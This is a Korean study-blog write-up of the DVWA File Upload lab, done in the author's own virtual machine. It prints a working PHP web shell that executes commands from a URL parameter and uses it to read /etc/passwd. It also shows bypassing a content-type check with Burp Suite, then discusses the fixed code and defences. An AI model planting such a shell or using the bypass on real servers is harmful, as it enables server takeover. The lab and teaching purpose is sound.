# Groot Security Study - Week 5

## DVWA의 내용들에 대해 직접 실습하고 그에 대한 보고서를 정리하는 블로그

### 개요
  * 5주차는 File Upload 공격에 관한 내용이다. File upload는 공격자가 악성 파일을 시스템에 업로드하여 시스템의 권한을 획득하거나 서버를 변조시키는 등의 방식으로 웹 서버를 장악하는 공격 방법이다.
  * File upload는 주로 웹쉘을 서버에 업로드 하는 방식으로 이루어지는데, 웹쉘이란 웹 서비스를 구동하기 위한 웹서버 환경에서 지원 가능한 웹 애플리케이션 언어를 기반으로 동작되는 파일을 의미하며 PHP, JSP등의 스크립트 언어를 이용하여 웹쉘을 제작할 수 있다.<br/>
  * 실습은 DVWA를 이용 하였으며, 실습 환경은 작성자의 가상머신에서 이루어졌다(ARM / VMWare Fusion - Kali Linux)<br/>

### 본론
**실습 과정**
  1. Low
      * 우선 시스템의 동작 방식을 알기 위해 시스템의 원래 의도대로 공격자의 local에서 파일을 골라 업로드 해 보았다. 업로드에 쓰인 test.txt파일은 단순히 test라는 문자열이 적힌 텍스트파일이다.
      <img src="/assets/230623/230623_screenshot_1.png" width="50%" height="50%" alt="Screenshot_of_file_upload_result"><br/><br/>
      * test.txt파일을 업로드 하면 위의 사진과 같이 해당 파일이 업로드된 서버 내부 디렉토리가 반환된다. 해당 위치를 참조하여 test.txt파일에 연결하면 아래 사진과 같이 test.txt의 내용이 출력되는 것을 알 수 있다. 서버 역할을 하는 컴퓨터 내부 문서를 웹페이지라고 하는 것을 생각해보면 대상 시스템에 'test'라는 텍스트가 보이는 웹 페이지를 업로드 한 것으로 생각할 수 있다.
      <img src="/assets/230623/230623_screenshot_2.png" width="50%" height="50%" alt="Screenshot_of_uploaded_file"><br/><br/>
      * 이에 업로드 할 파일을 일반적인 텍스트파일이 아닌 스크립트 언어로 제작된 웹쉘로 선택한다면, 다른 부가적인 동작을 유도할 수 있을 것으로 생각된다. 그래서 다음과 같은 코드의 웹쉘을 하나 만들었다.     
      ```php
        <?php
          $cmd = $_GET['command'];
          if(isset($cmd))
          system($cmd);
        ?>
      ```
      * 해당 웹쉘은 PHP를 기반으로 하고 있으며, 'command'를 인자로 전달받아 'cmd'라는 변수를 생성하고, 'cmd'의 값이 설정되어 있다면(isset()으로 확인) system()함수를 이용하여 CL(Command Line)명령어로 전달하여 실행시킨다. 이에 기반해 해당 PHP파일을 업로드 한 뒤, command의 값을 'cat /etc/passwd'로 하여 해당 경로에 접속하면 다음과 같이 CLI에서 'cat /etc/passwd'명령을 실행한 것과 같은 결과를 얻을 수 있다.
      <img src="/assets/230623/230623_screenshot_4.png" width="50%" height="50%" alt="Screenshot_of_webshell_upload_result"><br/><br/>

  2. Medium
      * 우선 해당 난이도의 시스템 소스코드를 확인해 보면 다음과 같다. 해당 코드를 확인해보면, 업로드한 파일의 형식을 확인하여 jpeg 또는 png파일만 업로드를 허용하고 있다.
      ```php
      <?php
      if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

        // File information
        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

        // Is it an image?
        if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && ( $uploaded_size < 100000 ) ) {

          // Can we move the file to the upload folder?
          if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
          }
          else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
          }
        }
        else {
          // Invalid file
          echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
        }
      }
      ?> 
      ```
      * 따라서 burpsuite를 이용하여 시스템에 전달되는 파일의 형식을 확인해보면 php형식의 파일이 전달된다고 쓰인 부분이 있는데, 해당 위치의 값을 시스템에서 허가하고 있는 형식인 image/jpeg으로 변경해주고 forward로 전달해 주었다.
      <img src="/assets/230623/230623_screenshot_6.png" width="50%" height="50%" alt="Screenshot_of_burpesuite_intercept"><br/><br/>
      * 그 결과, low에서처럼 'cat /etc/passwd'을 인자로 설정하면 해당 결과를 확인할 수 있다.
      <img src="/assets/230623/230623_screenshot_4.png" width="50%" height="50%" alt="Screenshot_of_webshell_upload_result"><br/><br/>

### 결론
  1. **원인 분석**
      * Low : 시스템의 소스코드를 확인해 보면 다음과 같다. 해당 소스코드를 확인해보면, 단순히 지정된 위치에 파일을 업로드하고, 업로드가 정상적으로 수행되었는지 여부를 반환한다. 해당 과정에서 스크립트 언어 형식을 차단한다거나 등의 시큐어 코딩이 전혀 되어있지 않아 문제가 되는것으로 보이고, 웹쉘이 정상적으로 동작하는 것을 보면 실행 권한 또한 막혀있지 않은것 같다.
      ```php
      <?php
      if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
          // No
          echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
          // Yes!
          echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
      }
      ?> 
      ```
      * Medium : 위의 실습과정에서 확인한 소스코드를 보면, 업로드된 파일의 형식을 확인하고는 있지만 요청이 인터셉트 되어 이미지 파일인것 처럼 전달되면 취약한 웹쉘의 업로드를 막을 수 없다. 업로드 된 파일의 형식을 확인하는 것이 아닌 다른 공격 차단 방법이 필요해 보인다.

  2. **예상 대응 방안**
      * 다음은 impossible 난이도의 소스코드이다. 해당 소스코드를 확인해보면, 이미지 파일 형식의 확장자로 업로드 되었을 경우, 해당 파일을 다시 인코딩하여 시스템에서 허가한 형식의 파일(이미지)만을 업로드 할 수 있게 제한함과 동시에 해당 이미지파일의 변조를 방지한다.
      ```php
      <?php
      if( isset( $_POST[ 'Upload' ] ) ) {

        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

        // File information
        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
        $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
        $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

        // Where are we going to be writing to?
        $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
        //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
        $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
        $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
        $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

        // Is it an image?
        if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && ( $uploaded_size < 100000 ) && ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && getimagesize( $uploaded_tmp ) ) {

          // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
          if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
          }
          else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
          }
          imagedestroy( $img );

          // Can we move the file to the web root from the temp folder?
          if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='{$target_path}{$target_file}'>{$target_file}</a> succesfully uploaded!</pre>";
          }
          else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
          }

          // Delete any temp files
          if( file_exists( $temp_file ) )
            unlink( $temp_file );
        }
        else {
          // Invalid file
          echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
        }
      }

      // Generate Anti-CSRF token
      generateSessionToken();
      ?> 
      ```
      * 위와 같은 파일 자체를 제한하는 방식 뿐 아니라, 만약 스크립트 언어로 작성된 파일의 업로드가 필요한 경우라면 업로드 대상 디렉터리에 파일의 실행권한을 주지 않도록 설정하기(chmod), 업로드 서버와 메인 동작 서버를 분리하기, 파일 이름을 난수화 하여 공격자가 본인의 웹쉘을 찾지 못하게 하기 등의 방법을 사용할 수 있을것이다.

### 마치며
  * 종강시즌이라 과제 & 시험때문에 지난 스터디의 피드백이나 추가적으로 공부하여 기록할 내용을 반영하지 못했거니와 2주정도 스터디에 참여하지 못하였는데, 이제 종강해서 한숨 돌렸으니 놓친 주차 학습등을 슬슬 따라가보려고 한다.(물론 방학이라고 할일이 없는건 아니지만 그래도 학기 중 보다는 덜 하지 않을까 싶다.)
  * 그리고 이번 주차부터는 스터디 이후 발표에 직접 발표는 안하더라도 참여해서 청강해보는거도 좋을 것 같다. 지난번에 보니 다들 영어로 진행하시는거 같던데 알아들을 수 있겠지...?

### 참조
  * [OWASP - File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  * [Wikipedia - Web Shell](https://en.wikipedia.org/wiki/Web_shell)